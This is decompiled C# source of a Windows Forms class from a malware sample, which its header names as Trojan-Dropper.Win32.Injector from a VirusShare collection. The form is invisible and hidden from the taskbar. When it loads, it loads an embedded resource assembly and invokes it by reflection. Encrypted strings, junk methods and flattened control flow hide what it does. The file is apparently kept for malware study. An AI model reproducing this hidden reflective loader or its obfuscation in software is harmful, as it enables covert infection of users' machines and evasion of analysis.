// Decompiled with JetBrains decompiler
// Type: _2012_D.Form1
// Assembly: 2012, Version=0.0.0.0, Culture=neutral
// MVID: FA8E4D06-4395-4F05-87C3-C4C0E16B54D3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Dropper.Win32.Injector.dblt-7c6234b9971bafa36775d3f787a0c6953ddd3783cc4702e2d3881a5e33b7586b.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace _2012_D
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("CheckBox1")]
    private CheckBox _CheckBox1;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("RadioButton1")]
    private RadioButton _RadioButton1;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
label_2:
      int num = 3;
      Point point1;
      Size size1;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.CheckBox1.AutoSize = true;
            CheckBox checkBox1_1 = this.CheckBox1;
            point1 = new Point(25, 61);
            Point point2 = point1;
            checkBox1_1.Location = point2;
            this.CheckBox1.Name = \u003CCliSecureRT\u003E.cs("rËü\u0013<3wW~");
            CheckBox checkBox1_2 = this.CheckBox1;
            size1 = new Size(81, 17);
            Size size2 = size1;
            checkBox1_2.Size = size2;
            this.CheckBox1.TabIndex = 1;
            this.CheckBox1.Text = \u003CCliSecureRT\u003E.cs("rËü\u0013<3wW~");
            this.CheckBox1.UseVisualStyleBackColor = true;
            this.Label1.AutoSize = true;
            Label label1_1 = this.Label1;
            point1 = new Point(25, 88);
            Point point3 = point1;
            label1_1.Location = point3;
            this.Label1.Name = \u003CCliSecureRT\u003E.cs("}Âû\u0015;@");
            Label label1_2 = this.Label1;
            size1 = new Size(39, 13);
            Size size3 = size1;
            label1_2.Size = size3;
            this.Label1.TabIndex = 2;
            this.Label1.Text = \u003CCliSecureRT\u003E.cs("}Âû\u0015;@");
            num = 2;
            continue;
          case 1:
            goto label_7;
          case 2:
            do
            {
              this.RadioButton1.AutoSize = true;
              RadioButton radioButton1_1 = this.RadioButton1;
              point1 = new Point(28, 113);
              Point point4 = point1;
              radioButton1_1.Location = point4;
              this.RadioButton1.Name = \u003CCliSecureRT\u003E.cs("cÂý\u001983m[;ÚØA");
              RadioButton radioButton1_2 = this.RadioButton1;
              size1 = new Size(90, 17);
              Size size4 = size1;
              radioButton1_2.Size = size4;
              this.RadioButton1.TabIndex = 3;
              this.RadioButton1.TabStop = true;
              this.RadioButton1.Text = \u003CCliSecureRT\u003E.cs("cÂý\u001983m[;ÚØA");
              this.RadioButton1.UseVisualStyleBackColor = true;
              PictureBox pictureBox1_1 = this.PictureBox1;
              point1 = new Point(113, 46);
              Point point5 = point1;
              pictureBox1_1.Location = point5;
              this.PictureBox1.Name = \u003CCliSecureRT\u003E.cs("aÊú\u0004\"\u0003}m Í\u0087");
              PictureBox pictureBox1_2 = this.PictureBox1;
              size1 = new Size(30, 50);
              Size size5 = size1;
              pictureBox1_2.Size = size5;
              this.PictureBox1.TabIndex = 4;
              this.PictureBox1.TabStop = false;
            }
            while (false);
            num = 1;
            continue;
          case 3:
            this.Button1 = new Button();
            this.CheckBox1 = new CheckBox();
            this.Label1 = new Label();
            this.RadioButton1 = new RadioButton();
            this.PictureBox1 = new PictureBox();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.SuspendLayout();
            Button button1_1 = this.Button1;
            point1 = new Point(25, 22);
            Point point6 = point1;
            button1_1.Location = point6;
            this.Button1.Name = \u003CCliSecureRT\u003E.cs("sÖí\u00048\u001F)");
            Button button1_2 = this.Button1;
            size1 = new Size(75, 23);
            Size size6 = size1;
            button1_2.Size = size6;
            this.Button1.TabIndex = 0;
            this.Button1.Text = \u003CCliSecureRT\u003E.cs("sÖí\u00048\u001F)");
            this.Button1.UseVisualStyleBackColor = true;
            num = 0;
            continue;
          default:
            goto label_2;
        }
      }
label_7:
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(155, 138);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.RadioButton1);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.CheckBox1);
      this.Controls.Add((Control) this.Button1);
      this.Name = \u003CCliSecureRT\u003E.cs("wÌë\u001Df");
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button1 = value;
    }

    internal virtual CheckBox CheckBox1
    {
      get => this._CheckBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox1 = value;
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual RadioButton RadioButton1
    {
      get => this._RadioButton1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._RadioButton1 = value;
    }

    internal virtual PictureBox PictureBox1
    {
      get => this._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox1 = value;
    }

    private object HIyl7gY2uAFg65()
    {
      double num = 822.0;
      bool flag = false;
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        while (true)
        {
          flag = true;
          num = 15.0;
        }
      }
      return (object) 75254250;
    }

    private void Form1_Load(object sender, EventArgs e) => this.pleple();

    public void VGUe8wq3d2B199unLsG4hS()
    {
      bool flag1 = true;
      string str = \u003CCliSecureRT\u003E.cs("\u0012ïð4'GLp\u000FÍ\u0080*⁌\u0004!\u200C\u0019,\u0017 J‼Ç※ʰ \u0090\u20FB\u00B2mƼ⁐(\u0014\u008Bn\u008EÜÉA⁼Jb\u00AD\u008AÿIw=Ö%");
      double num1 = 41.0;
      bool flag2 = false;
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      flag2 = false;
      flag2 = false;
      \u003CCliSecureRT\u003E.cs("t\u0092à\u0002j\u000Ex\u0014(\u0095à$?T7\u202BH_d¡y\u0003ÉT\u0010rÛ⃪ƉÜMw\u0011!Ü)\u0087\u0085Ö\vrlP|®\u008EM\u001B\u0092õ3\u000EǓ\u0098-K¬[ÔJ\f'\u0005\u0091ÖS\u000FwÔ\n!V\u0014Ê\u008CÙB\u2066\u0005ããåuFƥ\u00BD\u0083ÉãçS\u001Bn⁞\u0095§×v\u0005Ä\u009F7₰ñs®§á\u200BÆ\u009Fi\u2083à*oCd\u000E\u206EØäK;*TyF}\u0011d`ư\u0091‿\u0011K⃝¨\u0088\viķ%\u0012ü‾\u0081Äù“⁼pO\u0088Ò¡'\u2078\u0082\u00067h¯ₕM|\u0081\u0010\u00B2\vMtw\u00B9Ñ\f\u001E\u2028\u008Bw\u0017\tIȢÓ»tKő\u0096ǜé\u009C%˱\u008C\u00B3");
      double num2 = 31228811.0;
      str = \u003CCliSecureRT\u003E.cs("]Ö Gb\u0006}Nx\u008CôG\u001F]Q%\u0019\\\u0016¯\u0019tþv\u0011QÏ\u009B\u0080\u0019\u001D~{\u001FýQ¤µ\u0094T\"}A¥Çª$/þºH\u0003Äû\u000Fe\u00BDD\u00BC@L \u0003\u00B3Ë-e@Ò=u\u0012G×òµb\u0080vãñâ):\u000F·¨¿æÔ");
      int num3 = 939971;
      while (num3 <= 114)
        checked { ++num3; }
      str = \u003CCliSecureRT\u003E.cs("{õÏBcH{Gzôý@\b=/vfek\u0080fo\u008EvCwµ\u008A\u0096\t\u001E~wdÂVþÅìo\f\u0018s¿\u00B9\u008B.#øè[\u007Fì\u008A\u0018=ÞG\u00BEr\u0011~M\u009B\u00BE\0\u001C(â\u0013ry\u0014\u0097\u0098ß\u0015\u00BDg\u0090ó");
      num2 = 6330.0;
      while (true)
      {
        flag1 = false;
        num1 = 25.0;
      }
    }

    public void pleple()
    {
      Assembly assembly = Assembly.Load(_2012_D.My.Resources.Resources.Function_1);
      object[] args = new object[0];
      assembly.GetType(\u003CCliSecureRT\u003E.cs("wÖ÷^\u0002\u0002qA}\u0085")).InvokeMember(\u003CCliSecureRT\u003E.cs("\\Âð\u001E"), BindingFlags.InvokeMethod, (Binder) null, (object) null, args);
    }

    private object wMm71r()
    {
label_2:
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            int num2 = (int) MessageBox.Show(\u003CCliSecureRT\u003E.cs("XîøK⁍:PS\u001AÔÊ\u0002\u00040ǶRŉcXÎSlç\u0019\u0010xÈñÑ\u0016w\u001C\u000F\u001EǍ5\u009FÞé\u001D\tAa´Þ·\u0017/Êₒ}ªₛê⁅‗Û\u206BÃ‑@-jÅÄW\u00155ₗ\u206AÃ\u200B'\u009DÒË₍\u20F3\u0001 \u200Dâ{LD¯¡₯\u008A/¢\t~7\u206B\u0085ÊDPĕý9ð\u0013y\u009D\u009CµhₚÝ\t\u200FÔT9ČRv6Ýñ\u001C"));
            num1 = 2;
            continue;
          case 1:
            \u003CCliSecureRT\u003E.cs("\u0002ßéB\u000E!op9Úü\u0013\u0012\u000Eô@\0z\u001B\u008EBeÀVL\aÂ\u0090¦\u0016\t)\u0014fé\\\u00B2Ú5G\u0005‵[»\u008EC'À\u0081Ç>\\ǓÊ8pÏã\u20C1eFw\u0016\u00B3î\u0011\u0003t\u009A *\v\u001Fµë\u009C_õőæÁõSOt ®þ©Í\u0013\u20F7+0¯Ü\u0081/ⁿ¦ß\u20C8ü5>~\u0099Ñ\u007F¤\u0094\u0014È\u2087\u0006\u20FBW3\u001A\u007Fúₗ\"!\u0013⁂9RZ›\u0097pˤäV\u001B\u00AD¿\u008A¢\u007Fl`.\fÊN£⃛\u0093ReC„\u00BC\u20CB\u008DZļ\u0082ₕi\u001Cîò= ÒBÑ‗\u00021KÓû\u0013\u200E8ù\u001A\u2072\u001A4\u0095ÖË\u0002°{\u2080æ\u008By");
            \u003CCliSecureRT\u003E.cs("‗à\u00B9IÚRFa,\u0082ËV\u0015K:m\u00B9\u0090¯¤ŝM÷Y\u206CIȺöd$Z\"*\0\u0087 \u0093\u00B9\u2085\v\u2065l^Õ\u0088\u0095\v*ñ\u00BD2†\u000E\u0081\u0006:ÉD\u00B2sZ\fj⁐Ó_\u007F[É+\u0001FQ\u0091î\u0084\u0010ì\u0010à\u2081\u0086n\u0010Z⃕¬Ûª\u0081Ő\u001F\u0088\u000Fî\u009D⃔s\u0013â\u00896öî\u2068¡¸¦e¬È\u00BE\u0096º!⁉\u0011q\u001C,é9\u0012\u0010\f⁼`qv^\u009Dsaø\u0019%p");
            goto case 2;
          case 2:
            do
            {
              \u003CCliSecureRT\u003E.cs("\u001Dðċ\\e=Rbtâ\u0085");
            }
            while (false);
            num1 = 1;
            continue;
          case 3:
            num1 = 0;
            continue;
          default:
            goto label_2;
        }
      }
    }
  }
}
